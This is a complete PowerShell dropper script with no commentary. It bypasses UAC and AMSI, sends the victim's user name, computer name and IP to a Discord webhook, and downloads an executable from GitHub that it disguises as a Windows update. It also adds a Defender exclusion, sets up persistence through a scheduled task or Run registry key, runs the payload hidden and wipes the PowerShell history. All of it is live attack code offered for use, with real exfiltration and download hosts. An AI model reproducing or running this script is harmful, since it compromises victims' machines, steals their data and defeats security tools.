if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# --- CONFIG ---
$webhookUrl = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
$exeUrl = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
$exePath = "$env:APPDATA\win_system_update.exe"

function Send-Log ($msg) {
    try {
        $ip = (Invoke-RestMethod -Uri "https://api.ipify.org").trim()
        $payload = @{ content = "LOG: $msg | User: $env:USERNAME | PC: $env:COMPUTERNAME | IP: $ip" } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
    } catch {}
}

Send-Log "Script started as Admin"

# --- AMSI BYPASS ---
function Invoke-Bypass {
    try {
        $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $b = $a.GetField('amsiInitFailed','NonPublic,Static')
        $b.SetValue($null,$true)
        Send-Log "AMSI Disabled"
    } catch { Send-Log "AMSI Bypass Error" }
}
Invoke-Bypass

# --- PERSISTENCE ---
function Set-Persistence {
    try {
        $action = New-ScheduledTaskAction -Execute $exePath
        $trigger = New-JobTrigger -AtLogOn
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsUpdateCheck" -User "SYSTEM" -RunLevel Highest -Force | Out-Null
        Send-Log "Persistence: Scheduled Task created"
    } catch {
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $exePath
        Send-Log "Persistence: Registry key created"
    }
}

# --- MAIN ---
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($exeUrl, $exePath)
    Send-Log "EXE Downloaded to $exePath"

    Add-MpPreference -ExclusionPath $exePath -Force -ErrorAction SilentlyContinue
    Send-Log "Defender Exclusion added"

    Set-Persistence

    Start-Process -FilePath $exePath -WindowStyle Hidden
    Send-Log "Process started. Mission accomplished."
} catch {
    Send-Log "FATAL ERROR: $($_.Exception.Message)"
}

# CLEANUP
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
